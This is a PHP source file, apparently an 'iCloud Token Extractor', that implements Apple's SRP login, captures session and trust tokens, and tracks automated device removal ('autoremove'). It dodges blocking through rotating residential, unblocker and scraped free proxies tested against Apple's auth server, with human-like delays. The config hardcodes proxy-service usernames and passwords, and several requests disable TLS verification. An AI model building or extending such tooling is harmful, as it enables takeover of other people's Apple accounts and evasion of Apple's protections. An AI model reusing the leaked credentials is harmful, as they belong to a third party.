<?php
/**
 * iCloud Token Extractor — PHP Port
 * Migración completa del worker_gui.py
 * Requiere: PHP 7.4+, extensión gmp, extensión curl
 * 
 * Uso: php token_worker.php
 */

// 1. Permite el acceso desde cualquier lugar (el asterisco hace la magia)
header("Access-Control-Allow-Origin: *");

// 2. Permite los métodos HTTP que vayas a necesitar
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");

// 3. Permite los encabezados comunes que suelen enviar los navegadores o librerías como Axios/Fetch
header("Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With");

// ============================================================================
// GMP POLYFILL (fallback via BCMath if php-gmp extension is not installed)
// ============================================================================
if (!function_exists('gmp_init')) {
    if (!extension_loaded('bcmath')) {
        die("Error: Se requiere la extensión 'gmp' o 'bcmath' en PHP.\n");
    }

    function bchex2dec(string $hex): string {
        $hex = ltrim(strtolower($hex), '0');
        if ($hex === '') return '0';
        $dec = '0';
        $len = strlen($hex);
        for ($i = 0; $i < $len; $i += 4) {
            $chunk = substr($hex, $i, 4);
            $multiplier = (string)(1 << (strlen($chunk) * 4));
            $dec = bcmul($dec, $multiplier);
            $dec = bcadd($dec, (string)hexdec($chunk));
        }
        return $dec;
    }

    function bcdec2hex(string $dec): string {
        if ($dec === '0' || $dec === '') return '0';
        $hex = '';
        while (bccomp($dec, '0') > 0) {
            $mod = bcmod($dec, '16');
            $hex = dechex((int)$mod) . $hex;
            $dec = bcdiv($dec, '16', 0);
        }
        return $hex;
    }

    function gmp_init($val, int $base = 10) {
        $str = (string)$val;
        if ($base === 16) {
            return bchex2dec($str);
        }
        return $str;
    }

    function gmp_import(string $data) {
        $hex = bin2hex($data);
        if ($hex === '') return '0';
        return bchex2dec($hex);
    }

    function gmp_powm($base, $exp, $mod) {
        return bcpowmod((string)$base, (string)$exp, (string)$mod, 0);
    }

    function gmp_cmp($a, $b): int {
        return bccomp((string)$a, (string)$b, 0);
    }

    function gmp_mod($a, $b) {
        $r = bcmod((string)$a, (string)$b, 0);
        if (bccomp($r, '0') < 0) {
            $r = bcadd($r, (string)$b, 0);
        }
        return $r;
    }

    function gmp_mul($a, $b) {
        return bcmul((string)$a, (string)$b, 0);
    }

    function gmp_sub($a, $b) {
        return bcsub((string)$a, (string)$b, 0);
    }

    function gmp_add($a, $b) {
        return bcadd((string)$a, (string)$b, 0);
    }

    function gmp_strval($num, int $base = 10): string {
        if ($base === 16) {
            return bcdec2hex((string)$num);
        }
        return (string)$num;
    }
}

// ============================================================================
// CONFIG
// ============================================================================
define('AUTH_ENDPOINT', 'https://idmsa.apple.com/appleauth/auth');
define('ICLOUD_SETUP_URL', 'https://setup.icloud.com/setup/ws/1/accountLogin');

$DEFAULT_CONFIG = [
    // ─── METODO DE CONEXION ───────────────────────────────────────────
    // Opciones disponibles:
    //   'direct'      → Sin proxy, conexion directa (fallback: free_proxy)
    //   'proxy'       → Usa proxy residencial (residential)
    //   'unblocker'   → Usa Site Unblocker (decodo)
    //   'smart'       → Intenta direct → proxy → unblocker automaticamente
    //   'free_proxy'  → Solo free proxies scrapeados
    //   'gitproxy'    → Proxies de listas GitHub (proxifly + multi-protocolo)
    // ─────────────────────────────────────────────────────────────────
    'mode' => 'direct',

    // ─── OPCIONES GENERALES ──────────────────────────────────────────
    'autoremove_enabled' => true,
    'max_retries' => 2,
    'human_delay' => true,

    // ─── PROXY RESIDENCIAL (modo 'proxy' o 'smart') ─────────────────
    'proxy_host' => 'gate.decodo.com',
    'proxy_user' => 'spbbx7qccs',
    'proxy_pass' => 'wqFdEaG_vfr2mL189r',
    'proxy_port_start' => 10001,
    'proxy_port_end' => 10010,

    // ─── SITE UNBLOCKER (modo 'unblocker' o 'smart') ────────────────
    'unblocker_host' => 'unblock.decodo.com',
    'unblocker_user' => 'U0000360915',
    'unblocker_pass' => 'PW_111be7b032503897a1855db112c61a7b8',
    'unblocker_port' => '60000',
];

$TOKEN_HEADERS = [
    'X-Apple-ID-Account-Country' => 'account_country',
    'X-Apple-ID-Session-Id' => 'session_id',
    'X-Apple-Session-Token' => 'session_token',
    'X-Apple-TwoSV-Trust-Token' => 'trust_token',
    'scnt' => 'scnt',
];

$STATS = ['total' => 0, 'successful' => 0, 'failed' => 0, 'errors_503' => 0, 'errors_401' => 0, 'errors_403' => 0, 'two_fa' => 0, 'cycle' => 0, 'autoremove_sent' => 0, 'autoremove_success' => 0, 'devices_removed' => 0];
$last_success_mode = null;

// ============================================================================
// FREE PROXY SCRAPER (fallback when direct fails)
// ============================================================================
define('FREE_PROXY_SOURCES', [
    'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
    'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
]);
define('FREE_PROXY_TEST_URL', 'http://httpbin.org/ip');
define('FREE_PROXY_TIMEOUT', 4);
define('FREE_PROXY_MICRO_BATCH', 15);
define('FREE_PROXY_MAX_GOOD', 3);
define('FREE_PROXY_CACHE_FILE', sys_get_temp_dir() . '/irealmServer_free_proxies.json');
define('FREE_PROXY_CACHE_TTL', 300); // 5 minutos
define('FREE_PROXY_MAX_SOURCES_FETCH', 2);

$_free_proxy_pool = [];
$_free_proxy_idx = 0;

function free_proxy_fetch_source(string $url): array
{
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL            => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 12,
        CURLOPT_CONNECTTIMEOUT => 8,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_USERAGENT      => 'Mozilla/5.0',
    ]);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpCode !== 200 || empty($response)) return [];

    $proxies = [];
    foreach (array_filter(array_map('trim', explode("\n", $response))) as $line) {
        if (preg_match('/^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5})/', $line, $m)) {
            $proxies[] = $m[1];
        }
    }
    return $proxies;
}

function free_proxy_test_batch(array $batch): array
{
    $mh = curl_multi_init();
    curl_multi_setopt($mh, CURLMOPT_MAXCONNECTS, FREE_PROXY_MICRO_BATCH);

    $handles = [];
    $starts  = [];

    foreach ($batch as $proxy) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL            => FREE_PROXY_TEST_URL,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_PROXY          => $proxy,
            CURLOPT_PROXYTYPE      => CURLPROXY_HTTP,
            CURLOPT_TIMEOUT        => FREE_PROXY_TIMEOUT,
            CURLOPT_CONNECTTIMEOUT => FREE_PROXY_TIMEOUT,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HEADER         => false,
            CURLOPT_USERAGENT      => 'Mozilla/5.0',
            CURLOPT_NOSIGNAL       => 1,
        ]);
        curl_multi_add_handle($mh, $ch);
        $handles[(int)$ch] = ['handle' => $ch, 'proxy' => $proxy];
        $starts[(int)$ch]  = microtime(true);
    }

    $running = null;
    do {
        curl_multi_exec($mh, $running);
        if ($running > 0) curl_multi_select($mh, 0.05);
    } while ($running > 0);

    $results = [];
    foreach ($handles as $id => $item) {
        $ch       = $item['handle'];
        $response = curl_multi_getcontent($ch);
        $error    = curl_error($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $latency  = round((microtime(true) - $starts[$id]) * 1000);

        if ($httpCode === 200 && !empty($response) && empty($error)) {
            $json = json_decode($response, true);
            if (isset($json['origin'])) {
                $results[] = [
                    'proxy'      => $item['proxy'],
                    'latency_ms' => $latency,
                ];
            }
        }

        curl_multi_remove_handle($mh, $ch);
        curl_close($ch);
    }

    curl_multi_close($mh);
    usort($results, fn($a, $b) => $a['latency_ms'] <=> $b['latency_ms']);
    return $results;
}

function free_proxy_get_pool(): array
{
    // Check cache first
    if (file_exists(FREE_PROXY_CACHE_FILE)) {
        $cache = json_decode(file_get_contents(FREE_PROXY_CACHE_FILE), true);
        if ($cache && ($cache['ts'] ?? 0) > time() - FREE_PROXY_CACHE_TTL && !empty($cache['proxies'])) {
            unified_log('debug', 'FREE_PROXY', 'Using cached pool: ' . count($cache['proxies']) . ' proxies');
            return $cache['proxies'];
        }
    }

    unified_log('info', 'FREE_PROXY', 'Fast-scraping free proxies (micro-batch mode)...');

    $sources = FREE_PROXY_SOURCES;
    shuffle($sources);
    $sources = array_slice($sources, 0, FREE_PROXY_MAX_SOURCES_FETCH);

    $all = [];
    foreach ($sources as $source) {
        $fetched = free_proxy_fetch_source($source);
        if (!empty($fetched)) {
            $all = array_merge($all, $fetched);
            unified_log('debug', 'FREE_PROXY', '  Fetched ' . count($fetched) . ' from source');
            if (count($all) >= 100) break;
        }
    }

    $all = array_values(array_unique($all));
    shuffle($all);

    if (empty($all)) {
        unified_log('warning', 'FREE_PROXY', 'No proxies scraped from any source');
        return [];
    }

    unified_log('info', 'FREE_PROXY', count($all) . ' unique proxies — testing in micro-batches of ' . FREE_PROXY_MICRO_BATCH . '...');

    $good = [];
    foreach (array_chunk($all, FREE_PROXY_MICRO_BATCH) as $batch_num => $batch) {
        $passed = free_proxy_test_batch($batch);
        if (!empty($passed)) {
            $good = array_merge($good, $passed);
            unified_log('success', 'FREE_PROXY', 'Batch #' . ($batch_num + 1) . ': found ' . count($passed) . ' working proxy(ies) — stopping early');
            break;
        }
        unified_log('debug', 'FREE_PROXY', 'Batch #' . ($batch_num + 1) . ': 0/' . count($batch) . ' passed');
        if ($batch_num >= 5) {
            unified_log('warning', 'FREE_PROXY', 'Giving up after 6 micro-batches');
            break;
        }
    }

    $good = array_slice($good, 0, FREE_PROXY_MAX_GOOD);

    if (!empty($good)) {
        $proxies = array_column($good, 'proxy');
        $avg = round(array_sum(array_column($good, 'latency_ms')) / count($good));
        unified_log('success', 'FREE_PROXY', count($good) . ' working proxies found (avg ' . $avg . 'ms)');

        // Cache
        file_put_contents(FREE_PROXY_CACHE_FILE, json_encode([
            'ts' => time(),
            'proxies' => $proxies,
        ], JSON_UNESCAPED_SLASHES), LOCK_EX);

        return $proxies;
    }

    unified_log('warning', 'FREE_PROXY', 'No working free proxies found');
    return [];
}

function free_proxy_next(): ?string
{
    global $_free_proxy_pool, $_free_proxy_idx;

    if (empty($_free_proxy_pool)) {
        $_free_proxy_pool = free_proxy_get_pool();
        $_free_proxy_idx = 0;
    }

    if (empty($_free_proxy_pool)) return null;

    $proxy = $_free_proxy_pool[$_free_proxy_idx % count($_free_proxy_pool)];
    $_free_proxy_idx++;
    return 'http://' . $proxy;
}

// ============================================================================
// GITPROXY — Proxies from GitHub lists (proxifly/free-proxy-list + extras)
// ============================================================================
define('GITPROXY_SOURCES', [
    // ─── Proxifly (alta calidad, actualizados frecuentemente) ────────
    'http'   => 'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt',
    'socks4' => 'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks4/data.txt',
    'socks5' => 'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt',
    'all'    => 'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/all/data.txt',
    // ─── US-only (menor latencia hacia Apple) ────────────────────────
    'us'     => 'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/countries/US/data.txt',
]);

define('GITPROXY_TEST_URL', 'https://idmsa.apple.com');
define('GITPROXY_TEST_TIMEOUT', 6);
define('GITPROXY_MICRO_BATCH', 15);
define('GITPROXY_MAX_GOOD', 3);
define('GITPROXY_CACHE_FILE', sys_get_temp_dir() . '/irealmServer_gitproxies.json');
define('GITPROXY_CACHE_TTL', 600); // 10 minutos (más largo que free_proxy)
define('GITPROXY_MAX_MICRO_ROUNDS', 8);

$_gitproxy_pool = [];
$_gitproxy_idx  = 0;

/**
 * Descarga y parsea una lista de proxies desde GitHub CDN.
 * Cada línea puede ser: ip:port o protocol://ip:port
 */
function gitproxy_fetch_source(string $url, string $protocol_hint): array
{
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL            => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 15,
        CURLOPT_CONNECTTIMEOUT => 10,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_USERAGENT      => 'Mozilla/5.0 (compatible; irealmServer-GitProxy/1.0)',
        CURLOPT_HTTPHEADER     => ['Accept: text/plain'],
    ]);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpCode !== 200 || empty($response)) {
        unified_log('warning', 'GITPROXY', "Failed to fetch {$protocol_hint} list from CDN (HTTP {$httpCode})");
        return [];
    }

    $proxies = [];
    $lines = array_filter(array_map('trim', explode("\n", $response)));

    foreach ($lines as $line) {
        // Formato: protocol://ip:port
        if (preg_match('#^(https?|socks[45])://(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5})$#i', $line, $m)) {
            $proxies[] = [
                'protocol' => strtolower($m[1]),
                'address'  => $m[2],
                'url'      => strtolower($line),
            ];
            continue;
        }
        // Formato: ip:port (sin protocolo → usar hint)
        if (preg_match('/^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5})$/', $line, $m)) {
            $proto = ($protocol_hint === 'all') ? 'http' : $protocol_hint;
            $proxies[] = [
                'protocol' => $proto,
                'address'  => $m[1],
                'url'      => "{$proto}://{$m[1]}",
            ];
        }
    }

    return $proxies;
}

/**
 * Testea un batch de proxies en paralelo contra Apple (HEAD request, solo verifica conectividad).
 * Prioriza HTTP para compatibilidad máxima con cURL + Apple endpoints.
 */
function gitproxy_test_batch(array $batch): array
{
    $mh = curl_multi_init();
    curl_multi_setopt($mh, CURLMOPT_MAXCONNECTS, GITPROXY_MICRO_BATCH);

    $handles = [];
    $starts  = [];

    foreach ($batch as $idx => $proxy) {
        $ch = curl_init();

        $curlOpts = [
            CURLOPT_URL            => GITPROXY_TEST_URL,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_NOBODY         => true, // HEAD request — más rápido
            CURLOPT_PROXY          => $proxy['url'],
            CURLOPT_TIMEOUT        => GITPROXY_TEST_TIMEOUT,
            CURLOPT_CONNECTTIMEOUT => GITPROXY_TEST_TIMEOUT,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HEADER         => false,
            CURLOPT_USERAGENT      => 'Mozilla/5.0',
            CURLOPT_NOSIGNAL       => 1,
        ];

        // Configurar tipo de proxy según protocolo
        switch ($proxy['protocol']) {
            case 'socks4':
                $curlOpts[CURLOPT_PROXYTYPE] = CURLPROXY_SOCKS4;
                break;
            case 'socks5':
                $curlOpts[CURLOPT_PROXYTYPE] = CURLPROXY_SOCKS5;
                break;
            default: // http, https
                $curlOpts[CURLOPT_PROXYTYPE] = CURLPROXY_HTTP;
                if ($proxy['protocol'] === 'https') {
                    $curlOpts[CURLOPT_PROXY_SSL_VERIFYPEER] = false;
                }
                break;
        }

        curl_setopt_array($ch, $curlOpts);
        curl_multi_add_handle($mh, $ch);
        $handles[(int)$ch] = ['handle' => $ch, 'proxy' => $proxy];
        $starts[(int)$ch]  = microtime(true);
    }

    $running = null;
    do {
        curl_multi_exec($mh, $running);
        if ($running > 0) curl_multi_select($mh, 0.05);
    } while ($running > 0);

    $results = [];
    foreach ($handles as $id => $item) {
        $ch       = $item['handle'];
        $error    = curl_error($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $latency  = round((microtime(true) - $starts[$id]) * 1000);

        // Apple devuelve 200, 301, 302, o incluso 403 — cualquiera indica conectividad
        if ($httpCode > 0 && empty($error)) {
            $results[] = [
                'proxy'      => $item['proxy'],
                'latency_ms' => $latency,
                'http_code'  => $httpCode,
            ];
        }

        curl_multi_remove_handle($mh, $ch);
        curl_close($ch);
    }

    curl_multi_close($mh);

    // Ordenar por latencia (más rápidos primero)
    usort($results, fn($a, $b) => $a['latency_ms'] <=> $b['latency_ms']);

    return $results;
}

/**
 * Construye el pool de proxies: descarga → deduplica → testea → cachea.
 * Fast-first-match: micro-batches de 15, para en cuanto encuentra una funcional.
 */
function gitproxy_get_pool(): array
{
    // Verificar cache
    if (file_exists(GITPROXY_CACHE_FILE)) {
        $cache = json_decode(file_get_contents(GITPROXY_CACHE_FILE), true);
        if ($cache && ($cache['ts'] ?? 0) > time() - GITPROXY_CACHE_TTL && !empty($cache['proxies'])) {
            unified_log('debug', 'GITPROXY', 'Using cached pool: ' . count($cache['proxies']) . ' proxies');
            return $cache['proxies'];
        }
    }

    unified_log('info', 'GITPROXY', 'Fast-fetch proxy lists from GitHub CDN (micro-batch mode)...');

    $all_proxies = [];
    $seen_addresses = [];

    // Solo fetch 2 fuentes prioritarias para no demorar
    $priority_order = ['http', 'socks5'];

    foreach ($priority_order as $proto_key) {
        if (!isset(GITPROXY_SOURCES[$proto_key])) continue;

        $url = GITPROXY_SOURCES[$proto_key];
        $found = gitproxy_fetch_source($url, $proto_key);
        $new_count = 0;

        foreach ($found as $p) {
            if (!isset($seen_addresses[$p['address']])) {
                $seen_addresses[$p['address']] = true;
                $all_proxies[] = $p;
                $new_count++;
            }
        }

        unified_log('debug', 'GITPROXY', "  [{$proto_key}] fetched " . count($found) . " → {$new_count} new unique");

        // Si ya tenemos suficientes candidatos, no buscar más fuentes
        if (count($all_proxies) >= 200) break;
    }

    if (empty($all_proxies)) {
        // Fallback: intentar con 'all', 'us' y 'socks4'
        foreach (['all', 'us', 'socks4'] as $fallback_key) {
            if (!isset(GITPROXY_SOURCES[$fallback_key])) continue;
            $found = gitproxy_fetch_source(GITPROXY_SOURCES[$fallback_key], $fallback_key);
            foreach ($found as $p) {
                if (!isset($seen_addresses[$p['address']])) {
                    $seen_addresses[$p['address']] = true;
                    $all_proxies[] = $p;
                }
            }
            if (!empty($all_proxies)) break;
        }
    }

    if (empty($all_proxies)) {
        unified_log('warning', 'GITPROXY', 'No proxies fetched from any GitHub source');
        return [];
    }

    unified_log('info', 'GITPROXY', 'Total unique: ' . count($all_proxies) . ' — testing micro-batches of ' . GITPROXY_MICRO_BATCH . ' against Apple...');
    shuffle($all_proxies);

    $good = [];
    $chunks = array_chunk($all_proxies, GITPROXY_MICRO_BATCH);

    foreach ($chunks as $batch_num => $batch) {
        $passed = gitproxy_test_batch($batch);

        if (!empty($passed)) {
            $good = array_merge($good, $passed);
            $found_urls = implode(', ', array_map(fn($g) => $g['proxy']['url'], $passed));
            unified_log('success', 'GITPROXY', 'Batch #' . ($batch_num + 1) . ': found ' . count($passed) . ' working → stopping early');
            unified_log('debug', 'GITPROXY', "  Winners: {$found_urls}");
            break;
        }

        unified_log('debug', 'GITPROXY', 'Batch #' . ($batch_num + 1) . ': 0/' . count($batch) . ' passed');

        if ($batch_num + 1 >= GITPROXY_MAX_MICRO_ROUNDS) {
            unified_log('warning', 'GITPROXY', 'Giving up after ' . GITPROXY_MAX_MICRO_ROUNDS . ' micro-batches');
            break;
        }
    }

    $good = array_slice($good, 0, GITPROXY_MAX_GOOD);

    if (!empty($good)) {
        $urls = array_map(fn($g) => $g['proxy']['url'], $good);
        $avg = round(array_sum(array_column($good, 'latency_ms')) / count($good));

        // Desglose por protocolo
        $proto_counts = [];
        foreach ($good as $g) {
            $proto = $g['proxy']['protocol'];
            $proto_counts[$proto] = ($proto_counts[$proto] ?? 0) + 1;
        }
        $proto_str = implode(', ', array_map(fn($k, $v) => "{$k}:{$v}", array_keys($proto_counts), $proto_counts));

        unified_log('success', 'GITPROXY', count($good) . " working proxies (avg {$avg}ms) [{$proto_str}]");

        // Cachear
        file_put_contents(GITPROXY_CACHE_FILE, json_encode([
            'ts'      => time(),
            'proxies' => $urls,
        ], JSON_UNESCAPED_SLASHES), LOCK_EX);

        return $urls;
    }

    unified_log('warning', 'GITPROXY', 'No working GitHub proxies found after testing');
    return [];
}

/**
 * Obtiene el siguiente proxy del pool con rotación round-robin.
 */
function gitproxy_next(): ?string
{
    global $_gitproxy_pool, $_gitproxy_idx;

    if (empty($_gitproxy_pool)) {
        $_gitproxy_pool = gitproxy_get_pool();
        $_gitproxy_idx = 0;
    }

    if (empty($_gitproxy_pool)) return null;

    $proxy = $_gitproxy_pool[$_gitproxy_idx % count($_gitproxy_pool)];
    $_gitproxy_idx++;
    return $proxy; // Ya viene con protocolo: http://ip:port o socks5://ip:port
}

/**
 * Invalida el cache de gitproxy (útil si todas las proxies fallan).
 */
function gitproxy_flush_cache(): void
{
    global $_gitproxy_pool, $_gitproxy_idx;
    $_gitproxy_pool = [];
    $_gitproxy_idx = 0;
    @unlink(GITPROXY_CACHE_FILE);
    unified_log('info', 'GITPROXY', 'Cache flushed — next call will re-fetch from GitHub');
}

// ============================================================================
// UNIFIED LOGGING SYSTEM
// Centralized: writes to app/tmp/logs/apple/srp-YYYY-MM-DD.log via _logger.php.
// Falls back to local irealmServer_unified.log if the central logger is unavailable.
// ============================================================================
@require_once __DIR__ . '/../../_logger.php';
define('UNIFIED_LOG_FILE', ilog_file('apple', 'irealmServer_unified.log'));

$_current_request_id = null;

function _irealmServer_log_write(string $line): void
{
    if (function_exists('ilog')) {
        $path = ilog_path('apple', 'srp');
        @file_put_contents($path, ilog_redact($line), FILE_APPEND | LOCK_EX);
        return;
    }
    @file_put_contents(UNIFIED_LOG_FILE, $line, FILE_APPEND | LOCK_EX);
}

function unified_log_start_request(string $apple_id, string $client_ip, string $mode): void
{
    global $_current_request_id;
    $_current_request_id = strtoupper(substr(uniqid(), -8));

    $separator = "\n" . str_repeat('═', 80) . "\n";
    $header  = "  REQUEST #{$_current_request_id}  |  " . date('Y-m-d H:i:s') . "\n";
    $header .= "  Account: {$apple_id}  |  IP: {$client_ip}  |  Mode: " . strtoupper($mode) . "\n";
    $header .= str_repeat('─', 80) . "\n";

    _irealmServer_log_write($separator . $header);
}

function unified_log_end_request(bool $success, string $status, int $status_code, float $duration, ?string $connection_method = null): void
{
    global $_current_request_id;

    $icon = $success ? '✅ SUCCESS' : '❌ FAILED';
    $footer  = str_repeat('─', 80) . "\n";
    $footer .= "  RESULT: {$icon}  |  Status: {$status}  |  HTTP: {$status_code}  |  Duration: {$duration}s";
    if ($connection_method) $footer .= "  |  Via: {$connection_method}";
    $footer .= "\n" . str_repeat('═', 80) . "\n";

    _irealmServer_log_write($footer);
    $_current_request_id = null;
}

function unified_log(string $level, string $component, string $message): void
{
    global $_current_request_id;

    $time = date('H:i:s.') . substr(microtime(true), -3);
    $lvl = str_pad(strtoupper($level), 7);
    $comp = str_pad($component, 12);
    $rid = $_current_request_id ? "[{$_current_request_id}]" : '[--------]';

    _irealmServer_log_write("  {$time}  {$rid}  {$lvl}  {$comp}  {$message}\n");
}

// ============================================================================
// SRP-6a CONSTANTS (RFC 5054 — 2048-bit)
// ============================================================================
define('SRP_N_HEX', 'AC6BDB41324A9A9BF166DE5E1389582FAF72B6651987EE07FC3192943DB56050A37329CBB4A099ED8193E0757767A13DD52312AB4B03310DCD7F48A9DA04FD50E8083969EDB767B0CF6095179A163AB3661A05FBD5FAAAE82918A9962F0B93B855F97993EC975EEAA80D740ADBF4FF747359D041D5C33EA71D281E446B14773BCA97B43A23FB801676BD207A436C6481F1D2B9078717461A5B9D32E688F87748544523B524B0D57D5EA77A2775D2ECFA032CFBDBF52FB3786160279004E57AE6AF874E7303CE53299CCC041C7BC308D82A5698F3A8D0C38271AE35F8E9DBFBB694B5C803D89F7AE435DE236D525F54759B65E372FCD68EF20FA7111F9E4AFF73');
define('SRP_G', '2');

// ============================================================================
// LOGGING
// ============================================================================
function emit_log(string $type, string $message): void
{
    $time = date('H:i:s');
    $colors = ['error' => "\033[91m", 'success' => "\033[92m", 'info' => "\033[94m", 'system' => "\033[95m", 'warning' => "\033[93m", 'debug' => "\033[90m", 'removal' => "\033[96m"];
    $color = $colors[$type] ?? "\033[0m";
    $label = str_pad(strtoupper($type), 7);
    echo "{$time} | {$color}{$label}\033[0m | {$message}\n";

    // Also write to unified log
    unified_log($type, 'SRP_AUTH', $message);
}

// ============================================================================
// SRP PASSWORD (exact match of Python SrpPassword)
// ============================================================================
class SrpPassword
{
    private string $password;
    private string $hash;
    public ?string $salt = null;
    public ?int $iterations = null;
    public ?int $key_length = null;
    public ?string $protocol = null;

    public function __construct(string $password)
    {
        $this->password = $password;
        $this->hash = hash('sha256', $password, true); // raw binary
    }

    public function setEncryptInfo(string $salt, int $iterations, int $key_length, string $protocol): void
    {
        $this->salt = $salt;
        $this->iterations = $iterations;
        $this->key_length = $key_length;
        $this->protocol = $protocol;
    }

    public function encode(): string
    {
        if ($this->protocol === 's2k_fo') {
            $pwd = bin2hex($this->hash); // hex string as bytes
        }
        elseif ($this->protocol === 's2k') {
            $pwd = $this->hash; // raw binary
        }
        else {
            throw new \RuntimeException("Bad protocol: {$this->protocol}");
        }
        return hash_pbkdf2('sha256', $pwd, $this->salt, $this->iterations, $this->key_length, true);
    }
}

// ============================================================================
// SRP CLIENT (SRP-6a, RFC 5054, NG_2048, SHA256)
// Flags: rfc5054_enable + no_username_in_x (matching Python srp config)
// ============================================================================
class SrpClient
{
    private $N;
    private $g;
    private $a; // private random
    private $A; // public key
    private string $username;
    private SrpPassword $password;
    public ?string $H_AMK = null; // M2

    public function __construct(string $username, SrpPassword $password)
    {
        $this->N = gmp_init(SRP_N_HEX, 16);
        $this->g = gmp_init(SRP_G, 10);
        $this->username = $username;
        $this->password = $password;
    }

    /**
     * Start auth: generate random a, compute A = g^a mod N
     * Returns A as binary string
     */
    public function startAuthentication(): string
    {
        // Generate 256-bit random 'a'
        $rand_bytes = random_bytes(32);
        $this->a = gmp_import($rand_bytes);
        $this->A = gmp_powm($this->g, $this->a, $this->N);
        // Ensure A % N != 0
        if (gmp_cmp(gmp_mod($this->A, $this->N), gmp_init(0)) === 0) {
            return $this->startAuthentication(); // retry
        }
        return $this->gmpToBytes($this->A);
    }

    /**
     * Process server challenge: salt + B
     * Computes session key and returns M1 (proof)
     */
    public function processChallenge(string $salt, string $B_bytes): string
    {
        $B = gmp_import($B_bytes);
        // Verify B % N != 0
        if (gmp_cmp(gmp_mod($B, $this->N), gmp_init(0)) === 0) {
            throw new \RuntimeException('Server sent invalid B');
        }

        $N_bytes = $this->gmpToBytes($this->N);
        $width = strlen($N_bytes); // 256 for 2048-bit
        $A_bytes = $this->gmpToBytes($this->A);
        $B_norm = $this->gmpToBytes($B); // normalize B through GMP (strip leading zeros)

        // u = H(pad(A), pad(B)) — pysrp uses width=len(long_to_bytes(N))
        $u = gmp_import(hash('sha256', $this->padToWidth($A_bytes, $width) . $this->padToWidth($B_norm, $width), true));
        if (gmp_cmp($u, gmp_init(0)) === 0) {
            throw new \RuntimeException('u is zero');
        }

        // x = gen_x() from pysrp: H(salt, H(username + ':' + password.encode()))
        // With no_username_in_x: username = b'', so inner = H(b'' + b':' + password_key)
        $password_key = $this->password->encode();
        $inner_hash = hash('sha256', ':' . $password_key, true); // H(b':' + password_key)
        $x = gmp_import(hash('sha256', $salt . $inner_hash, true)); // H(salt | inner_hash)

        // k = H(N, g) — pysrp uses width=len(long_to_bytes(N)) for padding g
        $g_bytes = $this->gmpToBytes($this->g);
        $k = gmp_import(hash('sha256', $N_bytes . $this->padToWidth($g_bytes, $width), true));

        // S = (B - k * g^x mod N) ^ (a + u * x) mod N
        $gx = gmp_powm($this->g, $x, $this->N);
        $kgx = gmp_mod(gmp_mul($k, $gx), $this->N);
        $diff = gmp_mod(gmp_sub(gmp_add($B, $this->N), $kgx), $this->N);
        $exp = gmp_add($this->a, gmp_mul($u, $x));
        $S = gmp_powm($diff, $exp, $this->N);

        // K = H(S)
        $S_bytes = $this->gmpToBytes($S);
        $K = hash('sha256', $S_bytes, true);

        // M1 = calculate_M() from pysrp: H(HNxorHg | H(I) | s | A | B | K)
        // HNxorHg: hash N raw, hash g with padding
        $Hn = hash('sha256', $N_bytes, true);
        $g_padded = str_repeat("\x00", $width - strlen($g_bytes)) . $g_bytes;
        $Hg = hash('sha256', $g_padded, true);
        $HNxorHg = $Hn ^ $Hg;

        $Hu = hash('sha256', $this->username, true);

        // A and B as long_to_bytes() — no padding, just normalized through GMP
        $M1 = hash('sha256', $HNxorHg . $Hu . $salt . $A_bytes . $B_norm . $K, true);

        // M2 (H_AMK) = H(A | M1 | K)
        $this->H_AMK = hash('sha256', $A_bytes . $M1 . $K, true);

        return $M1;
    }

    /** Convert GMP to binary (big-endian, no leading zeros) */
    private function gmpToBytes($num): string
    {
        $hex = gmp_strval($num, 16);
        if (strlen($hex) % 2 !== 0)
            $hex = '0' . $hex;
        return hex2bin($hex);
    }

    /** Pad binary to N size (256 bytes for 2048-bit) */
    private function padTo(string $bytes): string
    {
        $target = 256; // 2048 bits / 8
        $len = strlen($bytes);
        if ($len < $target) {
            return str_repeat("\x00", $target - $len) . $bytes;
        }
        return $bytes;
    }

    /** Pad binary to specific width (matching pysrp's width parameter) */
    private function padToWidth(string $bytes, int $width): string
    {
        $len = strlen($bytes);
        if ($len < $width) {
            return str_repeat("\x00", $width - $len) . $bytes;
        }
        return $bytes;
    }
}

// ============================================================================
